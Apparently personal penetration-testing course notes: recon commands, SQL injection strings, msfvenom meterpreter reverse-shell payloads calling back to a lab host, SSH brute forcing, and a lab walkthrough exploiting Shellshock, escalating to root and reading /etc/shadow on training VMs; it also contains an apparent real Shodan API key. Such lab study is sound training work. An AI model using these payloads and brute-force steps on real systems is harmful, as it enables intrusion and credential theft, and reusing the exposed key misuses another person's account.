audo alien blah.rpm
saudo dpkg alien.dbm

#Active Recon Tools
sudo apt install metagoofil -y
metagoofil -d itsecgames.com -t doc,pdf -l 200 -o itsecgamesfiles -f [ENTER]
What this does is it targets the itsecgames.com domain, looking for .doc and .pdf files, limiting the results only to 200 files of each type, saving said files to a directory named “itsecgamesfiles” and saving HTML links to html_links_<TIMESTAMP>.txt file.

Maltego WILD mapping tool

# theHarvester
wrapper for service websites for inform ation
theHarvester -d bbc.com -l 100 -b bing [ENTER]
#whois
whois bbc.com [ENTER]
#nslookup
nslookup google.com [ENTER]
nslookup -type=ns google.com [ENTER]
nslookup -type=soa google.com [ENTER]
nslookup -query=mx google.com [ENTER]
nslookup -query=any google.com [ENTER]
nslookup google.com ns1.google.com


#recon-ng
sudo recon-ng
keys add shodan_api Cbum3OWAzSOA9oNi2zxi7BW50hFyjsko
marketplace install shodan_hostname
modules load recon/domains-hosts/shodan_hostname
##customize the modules
modules load recon/domains-hosts/shodan_hostname
info
options set SOURCE <target domain>

#zenmap on kali
sudo alien zenmap-7.91-1.noarch.rpm
sudo dpkg -i zenmap_7.91-2_all.deb

10.0.0.9 WIndows 10
10.0.0.6 kali
***************************************
10.0.0.4 Metasploitable
Not shown: 1013 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp  open  telnet      Linux telnetd
25/tcp  open  smtp        Postfix smtpd
53/tcp  open  domain      ISC BIND 9.4.2
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp open  rpcbind     2 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp open  exec        netkit-rsh rexecd
513/tcp open  login?
514/tcp open  tcpwrapped
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

sudo nmap 10.0.0.0/24 [ENTER] --excludefile exclude.txt

sudo dnsenum -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt -r google.com
**********************
fuzzing introduces unexpected inputs into a system and watches to see if the system has any negative reactions to the inputs that indicate security, performance, or quality gaps or issues
sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http:// <10.0.0.4>/FUZZ -c -t 400
sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.0.0.4/FUZZ -c -t 400 -mc 200 -v
#Gubuster
gobuster dir -x php -u http://10.0.0.3/mutillidae/ -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d http://10.0.0.3/mutillidae/ -w /usr/share/wordlists/dirb/common.txt I

#install python 3
sudo apt install python3 python3-pip git -y
sudo pip3 install tld requests
sudo git clone https://github.com/s0md3v/Photon

#SMTP enumaeration
VRFY <username>
#HTTP 
##nmap script
http-enum scipt
##Nikto checks for know exploits against those versions
nikto -h 10.0.0.3
##WPScan
wpscan -hh <url>
##Dirbuster
gui used to blasts some Dirbuster
#SMB enumeration 
- server message block, used by windows, poor security
enum4linux
smbclient
rpcclient
nmap scripts // smb-enum-users
#SNMP enumeration
snmpwalk
snmp-check
nmap-scripts
***************
# Vulnerability scanners
Nessus
OpenVAS
NSE scripts


#earchSploit allows you to perform detailed offline searches through your locally checked-out copy of the repository. This capability is particularly useful for security assessments on segregated or air-gapped networks without Internet access.[
sudo searchsploit -u #update search sploit
 sudo searchsploit afd windows local
 sudo searchsploit -t oracle windows
 sudo searchsploit WarFTP 1.65 -w

 #metasploit tom look for CVE
 sudo service postgresql start
 searching modules
 search rank:great
 search cve:2011
 search  type:exploits
 search cve:2011 platform:linux name:telnet type:exploit rank:great

 nmap –T4 -A -v 10.0.0.4 #run an nmap scan on the target box AGGRESIVE
exploit/unix/ftp/vsftpd_234_backdoor #exploit for the metapsloitedable box

#scan a box then search for ssh versions\
msf> search ssh_version
use auxiliary/scanner/ssh/ssh_version 

#load balance detector
Lbd (Load Balance Detector)
lbd hackthissite.org

#OWASP
excute injection

Ford' or 1='1
select * FROM account WHERE username=""
'OR 1=1 --'

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<10.0.0.6> LPORT=4444 -f exe -o /root/evil.exe 
echo $url = “http://10.0.0.6/evil.exe” >> wget.ps1

medusa used to crack password
Step 1: Open a Terminal.

Step 2: Explore medusa.

               ~# medusa [ENTER] (Note: Review the options.)

Step 3: Run medusa.
medusa -h <Metasploitable2 IP> -U usernames.txt -P passwords.txt -M ssh -n 22 [ENTER]
 It finds 1 username and password that match.


 apt install beef-xss -y
 cd /usr/share/beef-xss [ENTER]
 nano config.yaml [ENTER]
####
Meterpreter: clearv


#35
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.6 LPORT=4444 -a x64 --platform windows -f exe -o /home/kali/victim.exe

search platform:windows type:exploit

#pw brute force over ssh
sudo msfconsole [ENTER]
 msf6 > use auxiliary/scanner/ssh/ssh_login [ENTER]
 msf6 auxiliary(scanner/ssh/ssh_login) > show options [ENTER]
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/seclists/Passwords/probable-v2-top207.txt [ENTER]
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS <Typhoon VM IP> [ENTER]
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME admin [ENTER]
msf6 auxiliary(scanner/ssh/ssh_login) >  set STOP_ON_SUCCESS true [ENTER]
 msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true [ENTER]
msf6 auxiliary(scanner/ssh/ssh_login) > run [ENTER]

  #nikto for web enumeration      
*]******************************************
Lab 40: Post Exploitation using Metasploit
 

Prepare the Attack
 

Step 1: Open Kali Linux virtual machine.

Step 2: Log in to Kali Linux as ‘kali’.

Step 3: Open Typhoon virtual machine.

Step 4: Open a terminal in Kali Linux virtual machine.

 

Scan with NMAP
 

Step 1: Run a ping sweep scan with Nmap.

               ~$ sudo nmap -sn 10.0.0.0/24 [ENTER]

Step 2: Determine the IP address of the Typhoon VM.

Step 3: Run a service enumeration against the target using Nmap.

               ~$ sudo nmap -sV <Typhoon VM IP> [ENTER]

               (Note the open ports and available services.)

 

Scan with Nikto
 

               ~$ sudo nikto -h <Typhoon VM IP> [ENTER]

               (Note the directory /cgi-bin/test.sh.)

 

Exploit Apache and Gain Access
 

               ~$ sudo service start postgresql [ENTER]

               ~$ sudo msfconsole [ENTER]

               msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec [ENTER]

               msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options [ENTER]

               msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS <Typhoon VM IP> [ENTER]

               msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/test.sh [ENTER]

               msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit [ENTER]

               meterpreter > getuid [ENTER]

               (Note: You do not have root access.)

               meterpreter > background [ENTER]

 

Find Applicable Exploits with Local Exploit Suggester
 

               msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > use post/multi/recon/local_exploit_suggester [ENTER]

               msf6 post(multi/recon/local_exploit_suggester) > show options [ENTER]

               msf6 post(multi/recon/local_exploit_suggester) > sessions -l [ENTER]

               msf6 post(multi/recon/local_exploit_suggester) > set SESSION <session number of meterpreter session> [ENTER]

               msf6 post(multi/recon/local_exploit_suggester) > run [ENTER]

               (Note: There are 6 exploits available. Scroll up to see them.

)

               (We would try them all to see which works and works the best.

 

Escalate Privileges
 

               [ENTER]

               msf6 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/apport_abrt_chroot_priv_esc [ENTER]

               msf6 exploit(linux/local/apport_abrt_chroot_priv_esc) > show options [ENTER]

               msf6 exploit(linux/local/apport_abrt_chroot_priv_esc) > sessions -ls [ENTER]

               msf6 exploit(linux/local/apport_abrt_chroot_priv_esc) > set SESSION <session number of the meterpreter session [ENTER]

               msf6 exploit(linux/local/apport_abrt_chroot_priv_esc) >  exploit [ENTER]

 

Verify Root Access
nikmeterpreter > getuid [ENTER]
               (Note: You now have root access.)

               meterpreter > cat /etc/shadow [ENTER]

               meterpreter > exit [ENTER]

               msf6 exploit(linux/local/apport_abrt_chroot_priv_esc) > back [ENTER]

               msf6 > exit -y [ENTER]

